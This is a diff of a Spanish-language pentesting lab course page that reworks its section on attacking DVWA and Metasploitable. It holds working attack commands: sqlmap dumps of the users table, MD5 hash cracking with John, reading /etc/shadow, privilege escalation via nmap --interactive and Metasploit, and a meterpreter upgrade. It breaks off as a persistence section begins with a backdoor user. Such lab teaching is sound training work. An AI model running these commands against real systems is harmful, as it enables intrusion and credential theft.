@@ -864,21 +864,42 @@ uid=0(root) gid=0(root)</code></pre>
 <section id="vector-4-bonus-dvwa-sql-injection-file-upload" class="level3" data-number="17.6.4">
 <h3 data-number="17.6.4" class="anchored" data-anchor-id="vector-4-bonus-dvwa-sql-injection-file-upload"><span class="header-section-number">17.6.4</span> 3.4 Vector 4 (Bonus) — DVWA SQL Injection + File Upload</h3>
 <p><strong>Descripción</strong>: DVWA (Damn Vulnerable Web Application) expone múltiples vulnerabilidades web. Utilizaremos SQLi para extraer credenciales y File Upload para subir una webshell.</p>
-<p><strong>Pre-requisito</strong>: Abrir <code>http://192.168.56.102/dvwa/</code> en el navegador, iniciar sesión con <code>admin/password</code>, ajustar el nivel de seguridad a “Low”.</p>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb26"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 4a. Extracción de credenciales con SQLmap</span></span>
-<span id="cb26-2"><a href="#cb26-2" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-u</span> <span class="st">"http://</span><span class="va">$TARGET</span><span class="st">/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit"</span> <span class="dt">\</span></span>
-<span id="cb26-3"><a href="#cb26-3" aria-hidden="true" tabindex="-1"></a>       <span class="at">--cookie</span><span class="op">=</span><span class="st">"security=low; PHPSESSID=&lt;tu_session_id&gt;"</span> <span class="dt">\</span></span>
-<span id="cb26-4"><a href="#cb26-4" aria-hidden="true" tabindex="-1"></a>       <span class="at">--dbs</span> <span class="at">--batch</span></span>
-<span id="cb26-5"><a href="#cb26-5" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb26-6"><a href="#cb26-6" aria-hidden="true" tabindex="-1"></a><span class="co"># Ver tablas de la base de datos dvwa</span></span>
-<span id="cb26-7"><a href="#cb26-7" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-u</span> <span class="st">"http://</span><span class="va">$TARGET</span><span class="st">/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit"</span> <span class="dt">\</span></span>
-<span id="cb26-8"><a href="#cb26-8" aria-hidden="true" tabindex="-1"></a>       <span class="at">--cookie</span><span class="op">=</span><span class="st">"security=low; PHPSESSID=&lt;tu_session_id&gt;"</span> <span class="dt">\</span></span>
-<span id="cb26-9"><a href="#cb26-9" aria-hidden="true" tabindex="-1"></a>       <span class="at">-D</span> dvwa <span class="at">--tables</span> <span class="at">--batch</span></span>
-<span id="cb26-10"><a href="#cb26-10" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb26-11"><a href="#cb26-11" aria-hidden="true" tabindex="-1"></a><span class="co"># Volcar tabla de usuarios</span></span>
-<span id="cb26-12"><a href="#cb26-12" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-u</span> <span class="st">"http://</span><span class="va">$TARGET</span><span class="st">/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit"</span> <span class="dt">\</span></span>
-<span id="cb26-13"><a href="#cb26-13" aria-hidden="true" tabindex="-1"></a>       <span class="at">--cookie</span><span class="op">=</span><span class="st">"security=low; PHPSESSID=&lt;tu_session_id&gt;"</span> <span class="dt">\</span></span>
-<span id="cb26-14"><a href="#cb26-14" aria-hidden="true" tabindex="-1"></a>       <span class="at">-D</span> dvwa <span class="at">-T</span> users <span class="at">--dump</span> <span class="at">--batch</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<p><strong>Pre-requisito</strong>: Abrir <code>http://$TARGET/dvwa/</code> en el navegador, iniciar sesión con <code>admin/password</code>, ajustar el nivel de seguridad a “Low”.</p>
+<section id="paso-1-identificar-tu-sesión-de-dvwa" class="level4" data-number="17.6.4.1">
+<h4 data-number="17.6.4.1" class="anchored" data-anchor-id="paso-1-identificar-tu-sesión-de-dvwa"><span class="header-section-number">17.6.4.1</span> Paso 1: Identificar tu sesión de DVWA</h4>
+<p><strong>Tu tarea</strong>: Inicia sesión en DVWA y obtén tu cookie de sesión.</p>
+<p><strong>Pasos:</strong> 1. Abre <code>http://$TARGET/dvwa/</code> en el navegador 2. Inicia sesión con <code>admin/password</code> 3. Abre las herramientas de desarrollador del navegador (F12) 4. Ve a la pestaña de Application &gt; Cookies 5. Copia el valor de la cookie <code>PHPSESSID</code> 6. Nota: También necesitarás la cookie <code>security</code> establecida en <code>low</code></p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb26"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Guardar tus cookies para usar en sqlmap (reemplazar con tus valores reales)</span></span>
+<span id="cb26-2"><a href="#cb26-2" aria-hidden="true" tabindex="-1"></a><span class="bu">export</span> <span class="va">PHPSESSID</span><span class="op">=</span><span class="st">"tu_valor_de_cookie_aqui"</span></span>
+<span id="cb26-3"><a href="#cb26-3" aria-hidden="true" tabindex="-1"></a><span class="bu">export</span> <span class="va">SECURITY_COOKIE</span><span class="op">=</span><span class="st">"low"</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="paso-2-extracción-de-credenciales-con-sqlmap" class="level4" data-number="17.6.4.2">
+<h4 data-number="17.6.4.2" class="anchored" data-anchor-id="paso-2-extracción-de-credenciales-con-sqlmap"><span class="header-section-number">17.6.4.2</span> Paso 2: Extracción de credenciales con SQLmap</h4>
+<p><strong>Tu tarea</strong>: Ejecutar los siguientes comandos para extraer información de la base de datos.</p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb27"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 4a. Listar todas las bases de datos</span></span>
+<span id="cb27-2"><a href="#cb27-2" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-u</span> <span class="st">"http://</span><span class="va">$TARGET</span><span class="st">/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit"</span> <span class="dt">\</span></span>
+<span id="cb27-3"><a href="#cb27-3" aria-hidden="true" tabindex="-1"></a>        <span class="at">--cookie</span><span class="op">=</span><span class="st">"security=low; PHPSESSID=</span><span class="va">$PHPSESSID</span><span class="st">"</span> <span class="dt">\</span></span>
+<span id="cb27-4"><a href="#cb27-4" aria-hidden="true" tabindex="-1"></a>        <span class="at">--dbs</span> <span class="at">--batch</span></span>
+<span id="cb27-5"><a href="#cb27-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb27-6"><a href="#cb27-6" aria-hidden="true" tabindex="-1"></a><span class="co"># 4b. Ver tablas de la base de datos dvwa</span></span>
+<span id="cb27-7"><a href="#cb27-7" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-u</span> <span class="st">"http://</span><span class="va">$TARGET</span><span class="st">/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit"</span> <span class="dt">\</span></span>
+<span id="cb27-8"><a href="#cb27-8" aria-hidden="true" tabindex="-1"></a>        <span class="at">--cookie</span><span class="op">=</span><span class="st">"security=low; PHPSESSID=</span><span class="va">$PHPSESSID</span><span class="st">"</span> <span class="dt">\</span></span>
+<span id="cb27-9"><a href="#cb27-9" aria-hidden="true" tabindex="-1"></a>        <span class="at">-D</span> dvwa <span class="at">--tables</span> <span class="at">--batch</span></span>
+<span id="cb27-10"><a href="#cb27-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb27-11"><a href="#cb27-11" aria-hidden="true" tabindex="-1"></a><span class="co"># 4c. Ver columnas de la tabla de usuarios</span></span>
+<span id="cb27-12"><a href="#cb27-12" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-u</span> <span class="st">"http://</span><span class="va">$TARGET</span><span class="st">/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit"</span> <span class="dt">\</span></span>
+<span id="cb27-13"><a href="#cb27-13" aria-hidden="true" tabindex="-1"></a>        <span class="at">--cookie</span><span class="op">=</span><span class="st">"security=low; PHPSESSID=</span><span class="va">$PHPSESSID</span><span class="st">"</span> <span class="dt">\</span></span>
+<span id="cb27-14"><a href="#cb27-14" aria-hidden="true" tabindex="-1"></a>        <span class="at">-D</span> dvwa <span class="at">-T</span> users <span class="at">--columns</span> <span class="at">--batch</span></span>
+<span id="cb27-15"><a href="#cb27-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb27-16"><a href="#cb27-16" aria-hidden="true" tabindex="-1"></a><span class="co"># 4d. Volcar tabla de usuarios</span></span>
+<span id="cb27-17"><a href="#cb27-17" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-u</span> <span class="st">"http://</span><span class="va">$TARGET</span><span class="st">/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit"</span> <span class="dt">\</span></span>
+<span id="cb27-18"><a href="#cb27-18" aria-hidden="true" tabindex="-1"></a>        <span class="at">--cookie</span><span class="op">=</span><span class="st">"security=low; PHPSESSID=</span><span class="va">$PHPSESSID</span><span class="st">"</span> <span class="dt">\</span></span>
+<span id="cb27-19"><a href="#cb27-19" aria-hidden="true" tabindex="-1"></a>        <span class="at">-D</span> dvwa <span class="at">-T</span> users <span class="at">--dump</span> <span class="at">--batch</span></span>
+<span id="cb27-20"><a href="#cb27-20" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb27-21"><a href="#cb27-21" aria-hidden="true" tabindex="-1"></a><span class="co"># 4e. Extraer credenciales específicas (alternativa más rápida)</span></span>
+<span id="cb27-22"><a href="#cb27-22" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-u</span> <span class="st">"http://</span><span class="va">$TARGET</span><span class="st">/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit"</span> <span class="dt">\</span></span>
+<span id="cb27-23"><a href="#cb27-23" aria-hidden="true" tabindex="-1"></a>        <span class="at">--cookie</span><span class="op">=</span><span class="st">"security=low; PHPSESSID=</span><span class="va">$PHPSESSID</span><span class="st">"</span> <span class="dt">\</span></span>
+<span id="cb27-24"><a href="#cb27-24" aria-hidden="true" tabindex="-1"></a>        <span class="at">-D</span> dvwa <span class="at">-T</span> users <span class="at">-C</span> user_id,user,password <span class="at">--dump</span> <span class="at">--batch</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 <p><strong>Output esperado</strong>:</p>
 <pre><code>Database: dvwa
 Table: users
@@ -892,12 +913,13 @@ Table: users
 | 4       | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 | Picasso  |
 | 5       | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 | Smith    |
 +---------+---------+----------------------------------+----------+</code></pre>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb28"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Crackear hashes MD5 con john</span></span>
-<span id="cb28-2"><a href="#cb28-2" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">"admin:5f4dcc3b5aa765d61d8327deb882cf99"</span> <span class="op">&gt;</span> dvwa_hashes.txt</span>
-<span id="cb28-3"><a href="#cb28-3" aria-hidden="true" tabindex="-1"></a><span class="ex">john</span> dvwa_hashes.txt <span class="at">--format</span><span class="op">=</span>Raw-MD5 <span class="at">--wordlist</span><span class="op">=</span>/usr/share/wordlists/rockyou.txt</span>
-<span id="cb28-4"><a href="#cb28-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Resultado: password =&gt; password</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb29"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Crackear hashes MD5 con john</span></span>
+<span id="cb29-2"><a href="#cb29-2" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">"admin:5f4dcc3b5aa765d61d8327deb882cf99"</span> <span class="op">&gt;</span> dvwa_hashes.txt</span>
+<span id="cb29-3"><a href="#cb29-3" aria-hidden="true" tabindex="-1"></a><span class="ex">john</span> dvwa_hashes.txt <span class="at">--format</span><span class="op">=</span>Raw-MD5 <span class="at">--wordlist</span><span class="op">=</span>/usr/share/wordlists/rockyou.txt</span>
+<span id="cb29-4"><a href="#cb29-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Resultado: password =&gt; password</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 <p><strong>Entregable Fase 3</strong>: Para cada vector documentar: módulo MSF utilizado, opciones configuradas, output de <code>id</code>/<code>whoami</code>, captura de pantalla o archivo de log guardado.</p>
 <hr>
+</section>
 </section>
 </section>
 <section id="fase-4-post-explotación" class="level2" data-number="17.7">
@@ -908,24 +930,24 @@ Table: users
 </blockquote>
 <section id="reconocimiento-del-sistema-comprometido" class="level3" data-number="17.7.1">
 <h3 data-number="17.7.1" class="anchored" data-anchor-id="reconocimiento-del-sistema-comprometido"><span class="header-section-number">17.7.1</span> 4.1 Reconocimiento del Sistema Comprometido</h3>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb29"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Desde shell en el objetivo</span></span>
-<span id="cb29-2"><a href="#cb29-2" aria-hidden="true" tabindex="-1"></a><span class="co"># Información del sistema</span></span>
-<span id="cb29-3"><a href="#cb29-3" aria-hidden="true" tabindex="-1"></a><span class="fu">uname</span> <span class="at">-a</span></span>
-<span id="cb29-4"><a href="#cb29-4" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/issue</span>
-<span id="cb29-5"><a href="#cb29-5" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /proc/version</span>
-<span id="cb29-6"><a href="#cb29-6" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb29-7"><a href="#cb29-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Usuarios en el sistema</span></span>
-<span id="cb29-8"><a href="#cb29-8" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/passwd <span class="kw">|</span> <span class="fu">grep</span> <span class="at">-v</span> nologin <span class="kw">|</span> <span class="fu">grep</span> <span class="at">-v</span> false</span>
-<span id="cb29-9"><a href="#cb29-9" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/shadow</span>
-<span id="cb29-10"><a href="#cb29-10" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb29-11"><a href="#cb29-11" aria-hidden="true" tabindex="-1"></a><span class="co"># Procesos en ejecución</span></span>
-<span id="cb29-12"><a href="#cb29-12" aria-hidden="true" tabindex="-1"></a><span class="fu">ps</span> aux</span>
-<span id="cb29-13"><a href="#cb29-13" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb29-14"><a href="#cb29-14" aria-hidden="true" tabindex="-1"></a><span class="co"># Conexiones de red activas</span></span>
-<span id="cb29-15"><a href="#cb29-15" aria-hidden="true" tabindex="-1"></a><span class="fu">netstat</span> <span class="at">-tulpn</span></span>
-<span id="cb29-16"><a href="#cb29-16" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb29-17"><a href="#cb29-17" aria-hidden="true" tabindex="-1"></a><span class="co"># Archivos SUID — potenciales vectores de escalada</span></span>
-<span id="cb29-18"><a href="#cb29-18" aria-hidden="true" tabindex="-1"></a><span class="fu">find</span> / <span class="at">-perm</span> <span class="at">-4000</span> <span class="at">-type</span> f <span class="dv">2</span><span class="op">&gt;</span>/dev/null</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb30"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Desde shell en el objetivo</span></span>
+<span id="cb30-2"><a href="#cb30-2" aria-hidden="true" tabindex="-1"></a><span class="co"># Información del sistema</span></span>
+<span id="cb30-3"><a href="#cb30-3" aria-hidden="true" tabindex="-1"></a><span class="fu">uname</span> <span class="at">-a</span></span>
+<span id="cb30-4"><a href="#cb30-4" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/issue</span>
+<span id="cb30-5"><a href="#cb30-5" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /proc/version</span>
+<span id="cb30-6"><a href="#cb30-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb30-7"><a href="#cb30-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Usuarios en el sistema</span></span>
+<span id="cb30-8"><a href="#cb30-8" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/passwd <span class="kw">|</span> <span class="fu">grep</span> <span class="at">-v</span> nologin <span class="kw">|</span> <span class="fu">grep</span> <span class="at">-v</span> false</span>
+<span id="cb30-9"><a href="#cb30-9" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/shadow</span>
+<span id="cb30-10"><a href="#cb30-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb30-11"><a href="#cb30-11" aria-hidden="true" tabindex="-1"></a><span class="co"># Procesos en ejecución</span></span>
+<span id="cb30-12"><a href="#cb30-12" aria-hidden="true" tabindex="-1"></a><span class="fu">ps</span> aux</span>
+<span id="cb30-13"><a href="#cb30-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb30-14"><a href="#cb30-14" aria-hidden="true" tabindex="-1"></a><span class="co"># Conexiones de red activas</span></span>
+<span id="cb30-15"><a href="#cb30-15" aria-hidden="true" tabindex="-1"></a><span class="fu">netstat</span> <span class="at">-tulpn</span></span>
+<span id="cb30-16"><a href="#cb30-16" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb30-17"><a href="#cb30-17" aria-hidden="true" tabindex="-1"></a><span class="co"># Archivos SUID — potenciales vectores de escalada</span></span>
+<span id="cb30-18"><a href="#cb30-18" aria-hidden="true" tabindex="-1"></a><span class="fu">find</span> / <span class="at">-perm</span> <span class="at">-4000</span> <span class="at">-type</span> f <span class="dv">2</span><span class="op">&gt;</span>/dev/null</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 <p><strong>Output esperado</strong>:</p>
 <pre><code>Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
 
@@ -944,20 +966,20 @@ user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
 <section id="escalada-de-privilegios-desde-usuario-no-root" class="level3" data-number="17.7.2">
 <h3 data-number="17.7.2" class="anchored" data-anchor-id="escalada-de-privilegios-desde-usuario-no-root"><span class="header-section-number">17.7.2</span> 4.2 Escalada de Privilegios (desde usuario no-root)</h3>
 <p>Si el acceso obtenido es de usuario limitado (ej: <code>ircd</code>), usar los siguientes métodos:</p>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb31"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Método 1: nmap interactivo (versión antigua con --interactive)</span></span>
-<span id="cb31-2"><a href="#cb31-2" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">--interactive</span></span>
-<span id="cb31-3"><a href="#cb31-3" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span><span class="op">&gt;</span> !sh</span>
-<span id="cb31-4"><a href="#cb31-4" aria-hidden="true" tabindex="-1"></a><span class="fu">id</span></span>
-<span id="cb31-5"><a href="#cb31-5" aria-hidden="true" tabindex="-1"></a><span class="co"># uid=0(root)</span></span>
-<span id="cb31-6"><a href="#cb31-6" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb31-7"><a href="#cb31-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Método 2: Local Exploit Suggester en Metasploit</span></span>
-<span id="cb31-8"><a href="#cb31-8" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> use post/multi/recon/local_exploit_suggester</span>
-<span id="cb31-9"><a href="#cb31-9" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> set SESSION <span class="op">&lt;</span>id_sesion<span class="op">&gt;</span></span>
-<span id="cb31-10"><a href="#cb31-10" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> run</span>
-<span id="cb31-11"><a href="#cb31-11" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb31-12"><a href="#cb31-12" aria-hidden="true" tabindex="-1"></a><span class="co"># Método 3: Exploit de kernel (si la versión es vulnerable)</span></span>
-<span id="cb31-13"><a href="#cb31-13" aria-hidden="true" tabindex="-1"></a><span class="co"># Linux 2.6.24 es vulnerable a varios exploits locales</span></span>
-<span id="cb31-14"><a href="#cb31-14" aria-hidden="true" tabindex="-1"></a><span class="ex">searchsploit</span> <span class="st">"linux kernel 2.6.24 local"</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb32"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Método 1: nmap interactivo (versión antigua con --interactive)</span></span>
+<span id="cb32-2"><a href="#cb32-2" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">--interactive</span></span>
+<span id="cb32-3"><a href="#cb32-3" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span><span class="op">&gt;</span> !sh</span>
+<span id="cb32-4"><a href="#cb32-4" aria-hidden="true" tabindex="-1"></a><span class="fu">id</span></span>
+<span id="cb32-5"><a href="#cb32-5" aria-hidden="true" tabindex="-1"></a><span class="co"># uid=0(root)</span></span>
+<span id="cb32-6"><a href="#cb32-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb32-7"><a href="#cb32-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Método 2: Local Exploit Suggester en Metasploit</span></span>
+<span id="cb32-8"><a href="#cb32-8" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> use post/multi/recon/local_exploit_suggester</span>
+<span id="cb32-9"><a href="#cb32-9" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> set SESSION <span class="op">&lt;</span>id_sesion<span class="op">&gt;</span></span>
+<span id="cb32-10"><a href="#cb32-10" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> run</span>
+<span id="cb32-11"><a href="#cb32-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb32-12"><a href="#cb32-12" aria-hidden="true" tabindex="-1"></a><span class="co"># Método 3: Exploit de kernel (si la versión es vulnerable)</span></span>
+<span id="cb32-13"><a href="#cb32-13" aria-hidden="true" tabindex="-1"></a><span class="co"># Linux 2.6.24 es vulnerable a varios exploits locales</span></span>
+<span id="cb32-14"><a href="#cb32-14" aria-hidden="true" tabindex="-1"></a><span class="ex">searchsploit</span> <span class="st">"linux kernel 2.6.24 local"</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 <p><strong>Output esperado (local_exploit_suggester)</strong>:</p>
 <pre><code>[*] 192.168.56.102 - Collecting local exploits for linux/x86...
 [+] 192.168.56.102 - exploit/linux/local/udev_netlink: The target appears to be vulnerable.
@@ -965,105 +987,105 @@ user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
 </section>
 <section id="actualizar-shell-a-meterpreter" class="level3" data-number="17.7.3">
 <h3 data-number="17.7.3" class="anchored" data-anchor-id="actualizar-shell-a-meterpreter"><span class="header-section-number">17.7.3</span> 4.3 Actualizar Shell a Meterpreter</h3>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb33"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Desde msfconsole, con sesión de shell abierta</span></span>
-<span id="cb33-2"><a href="#cb33-2" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> sessions <span class="at">-l</span></span>
-<span id="cb33-3"><a href="#cb33-3" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb33-4"><a href="#cb33-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Actualizar shell a meterpreter</span></span>
-<span id="cb33-5"><a href="#cb33-5" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> sessions <span class="at">-u</span> <span class="op">&lt;</span>id_sesion_shell<span class="op">&gt;</span></span>
-<span id="cb33-6"><a href="#cb33-6" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb33-7"><a href="#cb33-7" aria-hidden="true" tabindex="-1"></a><span class="co"># O hacer upgrade manual</span></span>
-<span id="cb33-8"><a href="#cb33-8" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> use post/multi/manage/shell_to_meterpreter</span>
-<span id="cb33-9"><a href="#cb33-9" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> set SESSION <span class="op">&lt;</span>id<span class="op">&gt;</span></span>
-<span id="cb33-10"><a href="#cb33-10" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> run</span>
-<span id="cb33-11"><a href="#cb33-11" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb33-12"><a href="#cb33-12" aria-hidden="true" tabindex="-1"></a><span class="co"># En la nueva sesión meterpreter</span></span>
-<span id="cb33-13"><a href="#cb33-13" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> sysinfo</span>
-<span id="cb33-14"><a href="#cb33-14" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> getuid</span>
-<span id="cb33-15"><a href="#cb33-15" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> getpid</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb34"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Desde msfconsole, con sesión de shell abierta</span></span>
+<span id="cb34-2"><a href="#cb34-2" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> sessions <span class="at">-l</span></span>
+<span id="cb34-3"><a href="#cb34-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb34-4"><a href="#cb34-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Actualizar shell a meterpreter</span></span>
+<span id="cb34-5"><a href="#cb34-5" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> sessions <span class="at">-u</span> <span class="op">&lt;</span>id_sesion_shell<span class="op">&gt;</span></span>
+<span id="cb34-6"><a href="#cb34-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb34-7"><a href="#cb34-7" aria-hidden="true" tabindex="-1"></a><span class="co"># O hacer upgrade manual</span></span>
+<span id="cb34-8"><a href="#cb34-8" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> use post/multi/manage/shell_to_meterpreter</span>
+<span id="cb34-9"><a href="#cb34-9" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> set SESSION <span class="op">&lt;</span>id<span class="op">&gt;</span></span>
+<span id="cb34-10"><a href="#cb34-10" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> run</span>
+<span id="cb34-11"><a href="#cb34-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb34-12"><a href="#cb34-12" aria-hidden="true" tabindex="-1"></a><span class="co"># En la nueva sesión meterpreter</span></span>
+<span id="cb34-13"><a href="#cb34-13" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> sysinfo</span>
+<span id="cb34-14"><a href="#cb34-14" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> getuid</span>
+<span id="cb34-15"><a href="#cb34-15" aria-hidden="true" tabindex="-1"></a><span class="ex">meterpreter</span><span class="op">&gt;</span> getpid</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 <section id="persistencia" class="level3" data-number="17.7.4">
 <h3 data-number="17.7.4" class="anchored" data-anchor-id="persistencia"><span class="header-section-number">17.7.4</span> 4.4 Persistencia</h3>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb34"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Método 1: Agregar usuario backdoor al sistema</span></span>
